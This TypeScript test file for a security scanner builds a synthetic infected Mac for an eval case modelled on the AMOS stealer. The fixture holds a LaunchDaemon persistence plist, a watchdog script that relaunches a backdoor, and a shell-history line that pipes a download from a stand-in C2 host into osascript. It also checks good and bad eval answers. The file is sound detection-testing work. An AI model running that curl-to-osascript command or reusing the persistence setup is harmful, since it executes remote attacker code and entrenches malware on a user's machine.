// The offline eval case "macos-stealer" is a recorded run. This test rebuilds the
// infected Mac it stands for (a LaunchDaemon in a fake root, ~/.agent, ~/.mainhelper,
// a pasted ClickFix command in the shell history) and checks that the host scan
// still turns the eval's IOC file into the findings the recording holds.
import { cpSync, mkdirSync, readFileSync, utimesSync, writeFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { checkAnswer } from "../src/check.js";
import { validateIocs } from "../src/ioc.js";
import { Run } from "../src/run.js";
import type { Runner } from "../src/runner.js";
import { scanHost } from "../src/scan/host.js";
import { walk } from "../src/scan/walk.js";
import type { Finding, IocFile, Source } from "../src/types.js";
import { verdicts } from "../src/verdict.js";
import { tmp } from "./helpers.js";

const CASE = new URL("../evals/cases/offline/macos-stealer/", import.meta.url);
const read = <T>(rel: string): T => JSON.parse(readFileSync(new URL(rel, CASE), "utf8")) as T;
const NOW = new Date("2026-11-12T10:00:00Z");
const WHEN = new Date("2026-11-10T08:00:00Z");
const none: Runner = async () => ({ ok: false, status: 1, stdout: "", stderr: "", missing: true });
/** The recording's paths: the synthetic home is /Users/you, the fake root holds /Library. */
const HOME = "/Users/you";

function put(root: string, rel: string, body: string) {
  const p = join(root, rel);
  mkdirSync(join(p, ".."), { recursive: true });
  writeFileSync(p, body);
  utimesSync(p, WHEN, WHEN);
  return p;
}

function infectedMac() {
  const base = tmp("ug-eval-mac-");
  const home = join(base, "Users/you");
  const root = join(base, "root");
  const agent = put(
    home,
    ".agent",
    `#!/bin/bash\n# watchdog: run the backdoor as the console user\nwhile true; do\n  u=$(stat -f "%Su" /dev/console)\n  sudo -u "$u" "$HOME/.mainhelper"\n  sleep 1\ndone\n`,
  );
  put(home, ".mainhelper", "not malware: ultraguard eval fixture standing in for the AMOS backdoor binary\n");
  put(home, ".zsh_history", ": 1762761600:0;curl -s https://amos-c2.example/install | osascript\n");
  put(home, "code/app/README.md", "an ordinary project\n");
  put(
    root,
    "Library/LaunchDaemons/com.finder.helper.plist",
    `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.finder.helper</string>
  <key>ProgramArguments</key><array><string>/bin/bash</string><string>${agent}</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
`,
  );
  return { base, home, root };
}

/** A finding with the temp prefix replaced by the recording's paths, and only what a scan decides. */
function normalized(f: Omit<Finding, "id"> | Finding, base: string) {
  const fix = (s?: string) => s?.split(join(base, "Users/you")).join(HOME).split(join(base, "root")).join("");
  return { severity: f.severity, subject: fix(f.subject), title: fix(f.title), indicator: f.indicator?.type };
}

describe("eval macos-stealer", () => {
  it("its IOC file is valid against its sources", () => {
    expect(validateIocs(read("run/iocs.json"), read<Source[]>("run/sources.json"), NOW).problems).toEqual([]);
  });

  it("scanning the synthetic infected Mac gives host COMPROMISED, the findings the recording holds", async () => {
    const { base, home, root } = infectedMac();
    const iocs = read<IocFile>("run/iocs.json");
    const r = await scanHost(iocs, walk([join(home, "code")]), none, {
      home,
      platform: "darwin",
      startupDirs: [join(root, "Library/LaunchDaemons")],
      dropDirs: [],
      skipLive: true,
      av: "off",
      now: NOW,
    });
    const run = new Run(tmp("ug-eval-run-"));
    run.recordSurface(r.result, r.findings, r.gaps);
    expect(verdicts(run.findings(), run.gaps(), run.surfaces()).find((v) => v.surface === "host")?.verdict).toBe("COMPROMISED");
    const got = run.findings().map((f) => normalized(f, base));
    const recorded = read<Finding[]>("run/findings.json").filter((f) => f.surface === "host");
    expect(got).toEqual(recorded.map((f) => normalized(f, base)));
  });

  it("the good answer passes check, the bad one fails on the rules the case names", () => {
    const run = new Run(tmp("ug-eval-check-"));
    cpSync(fileURLToPath(new URL("run", CASE)), run.dir, { recursive: true });
    const answer = (f: string) => readFileSync(new URL(f, CASE), "utf8");
    expect(checkAnswer(run, answer("answer.good.md"))).toEqual([]);
    const rules = new Set(checkAnswer(run, answer("answer.bad.md")).map((p) => p.rule));
    for (const r of read<{ badRules: string[] }>("case.json").badRules) expect(rules).toContain(r);
  });
});
